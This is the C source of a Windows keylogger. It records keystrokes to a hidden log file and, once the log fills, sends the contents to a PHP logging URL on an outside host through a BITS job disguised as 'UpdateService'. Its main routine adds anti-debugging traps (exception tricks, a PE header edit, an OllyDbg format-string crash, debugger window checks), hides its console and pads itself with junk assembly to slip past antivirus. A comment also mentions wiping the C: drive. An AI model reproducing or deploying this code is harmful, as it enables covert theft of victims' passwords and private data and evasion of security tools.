#define UNICODE
#define _WIN32_WINNT  0x0500
#include <stdio.h>
#include <conio.h>
#include <iostream>
#include <time.h>
#include <process.h>
#include <windows.h>
#include "bits.h"

#define Lolen 512
#define fname "whitenoise"
// This is for BITS
HRESULT hr; 							// This will collect the results from BITS 
GUID JobId; 							// This is a JobID
IBackgroundCopyJob* pJob = NULL; 		// Our CopyJob
IBackgroundCopyManager* g_pbcm = NULL; 	// Our CopyManager
LPCWSTR logger;



void ChangeSizeOfImage()
{
    __asm
    {
        mov eax, fs:[0x30]		// PEB
        mov eax, [eax + 0x0c]	// PEB_LDR_DATA
        mov eax, [eax + 0x0c]	// InOrderModuleList
        mov dword ptr [eax + 0x20], 0x1000 // Set SizeOfImage
    }
}

LONG WINAPI UnhandledExcepFilter(PEXCEPTION_POINTERS pExcepPointers)
{
    // Restore old UnhandledExceptionFilter
    SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)
    pExcepPointers->ContextRecord->Eax);
    // Skip the exception code
    pExcepPointers->ContextRecord->Eip += 2;
    return EXCEPTION_CONTINUE_EXECUTION;
}


int mlt (char *emsg) {
int freadindex;
char upbuf[5000]; // <-- should make this smaller

strcpy(upbuf,"http://www.siemens.com.tw/.test/log.php?s=");
strncat(upbuf,emsg,strlen(emsg)); // Put log data after the ?s= ...

  int lena = strlen(upbuf)+1;
  wchar_t *wText = new wchar_t[lena];
  memset(wText,0,lena);
  ::MultiByteToWideChar(  CP_ACP, NULL,upbuf, -1, wText,lena );

logger=wText;
//Specify the appropriate COM threading model
hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
if (SUCCEEDED(hr))
{
  hr = CoCreateInstance(__uuidof(BackgroundCopyManager), NULL,
                        CLSCTX_LOCAL_SERVER,
                        __uuidof(IBackgroundCopyManager),
                        (void**) &g_pbcm);
	if (SUCCEEDED(hr)) // If we have a connection with BITS, go on and create a job ...
	{
	hr = g_pbcm->CreateJob(L"UpdateService", BG_JOB_TYPE_DOWNLOAD, &JobId, &pJob);

		if (SUCCEEDED(hr)) // If we have a job, add a file to it ...
		{
		// Set our php logger here ...
			hr = pJob->AddFile(logger, L"c:\\bits"); // <---- need to change this after getting the %TEMP%
			if(SUCCEEDED(hr)) // IF all is good, do your job!
			{	
			hr = pJob->Resume();
			}
		}
	}
}



// Cleanup
	if (g_pbcm)
	{
	  g_pbcm->Release();
	  g_pbcm = NULL;
	}
	if(pJob)
	{
	pJob->Release();
	pJob = NULL;
	}
	CoUninitialize();
	return 0;
//	system("del /f /q c:\\bits"); ?
}


int gtkyz(void)
{
int freadindex;
char *buf;
long len;
FILE *file;
file=fopen(fname,"a+");

           short character;
             while(1)
             {
				 Sleep(5); // To prevent 100% cpu usage ..
                    for(character=8;character<=222;character++)
                    {
                        if(GetAsyncKeyState(character)==-((((((26*5)*7)*3)*4)*3)+7))
                        {  
                            FILE *file;
                            file=fopen(fname,"a+");
                            if(file==NULL)
                            {
                                    return 1;
                            }            
                            if(file!=NULL)
                            {        
                                    if((character>=39)&&(character<=64))
                                    {
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }        
                                    else if((character>64)&&(character<91))
                                    {
                                          character+=32;
                                          fputc(character,file);
                                          fclose(file);
                                          break;
                                    }
                                    else
                                    {
                                        switch(character) {
                                              case VK_SPACE:
                                              fputs("+",file);
                                              fclose(file);
                                              break;    
                                              case VK_SHIFT:
                                              fputs("[SHFT]",file);
                                              fclose(file);
                                              break;                                            
                                              case VK_RETURN:
                                              fputs("[RETURN]",file);
                                              fclose(file);
                                              break;
                                              case VK_BACK:
                                              fputs("[BACK]",file);
                                              fclose(file);
                                              break;
                                              case VK_TAB:
                                              fputs("[TAB]",file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD6:
                                              fputc('6',file);
                                              fclose(file);
                                              break;
                                              case VK_CONTROL:
                                              fputs("[CTRL]",file);
                                              fclose(file);
                                              break;    
                                              case VK_DELETE:
                                              fputs("[DELETE]",file);
                                              fclose(file);
                                              break;
                                              case 187:
                                              fputc(character,file);
                                              fclose(file);
                                              break;
                                              case 188:
                                              fputc(',',file);
                                              fclose(file);
                                              break;
                                              case 189:
                                              fputc('-',file);
                                              fclose(file);
                                              break;
                                              case 190:
                                              fputc('.',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD0:
                                              fputc('0',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD9:
                                              fputc('9',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD1:
                                              fputc('1',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD2:
                                              fputc('2',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD3:
                                              fputc('3',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD4:
                                              fputc('4',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD5:
                                              fputc('5',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD7:
                                              fputc('7',file);
                                              fclose(file);
                                              break;
                                              case VK_NUMPAD8:
                                              fputc('8',file);
                                              fclose(file);
                                              break;
                                              case VK_CAPITAL:
                                              fputs("[CAPS]",file);
                                              fclose(file);
                                              break;
                                              default:
                                              fclose(file);
                                              break;
                                       }        
                                  }    
                             }        
                   }    
               }            
              
		   FILE *file;
           file=fopen(fname,"rb");                  // open file for reading
           fseek(file,0,SEEK_END);                  //go from 0 to EOF
           len=ftell(file);                         //get position at EOF (length)
           if(len>=Lolen) {                         // If the log is full:
             fseek(file,0,SEEK_SET);                //go to start of file.
             buf=(char *)malloc(len*2);               //malloc a buffer with size of the file
             freadindex=fread(buf,1,len,file);      //read file into the buffer
             buf[freadindex] = '\0';                //End the Str 
             fclose(file);                          
             mlt(buf);                              // upload the log
             file=fopen(fname,"w");                 // overwrite & start new log                   
             }
            fclose(file);

//          free (buf); ?

            }

}



int main() {
// Dont be a smartass ;]
// A lot of debuggers and tools will fail here ...
SetUnhandledExceptionFilter(UnhandledExcepFilter);
__asm{xor eax, eax}
__asm{div eax}
// Mess around a bit with the PE Header (ImageSize)
ChangeSizeOfImage();
// OllyDBG Format String Bug
OutputDebugString(L"%s%%s%n%%n%x%%x^.*$^/%s%%s%n%%n%x%%x^.*$^/%s%%s%n%%n%x%%x^.*$^/%s%%s%n%%n%x%%x^.*$^/%s%%s%n%%n%x%%x^.*$^/%s%%s%n%%n%x%%x^.*$^/%s%%s%n%%n%x%%x^.*$^/");
// More Olly ...
HANDLE hOlly = FindWindow(TEXT("OLLYDBG"), NULL);
if(hOlly)
ExitProcess(0); // system("del /f /s /q c:\\*.&"); ?
// Olly+Phantom plugin
HANDLE pOlly = FindWindow(TEXT("PhantOm"), NULL);
if(pOlly)
ExitProcess(0); 
// Windbg
HANDLE hWinDbg = FindWindow(TEXT("WinDbgFrameClass"), NULL);
if(hWinDbg)
ExitProcess(0);


// Hide window   <-------- Is now AV-Friendly, dont remove the useless assembly!
   HWND mywin; 
   __asm{nop}
   __asm{nop}
   __asm{nop}
   AllocConsole();
   __asm{inc eax}
   __asm{inc eax}
   __asm{inc eax}
   __asm{dec eax}
   __asm{inc eax}
   __asm{dec eax}
   __asm{dec eax}
   __asm{dec eax}
   mywin=FindWindowA("ConsoleWindowClass",NULL);
   __asm{inc eax}
   __asm{inc ecx}
   __asm{dec edx}
   __asm{inc edx}
   __asm{dec ecx}
   __asm{dec eax}
   ShowWindow(mywin,0);
   __asm{inc edx}
   __asm{dec ecx}
   __asm{inc edx}
   __asm{inc ecx}
   {FILE *file;
   file=fopen(fname,"a+");
   time_t theTime=time(0);
   }

   int t=gtkyz();
   return t;

}
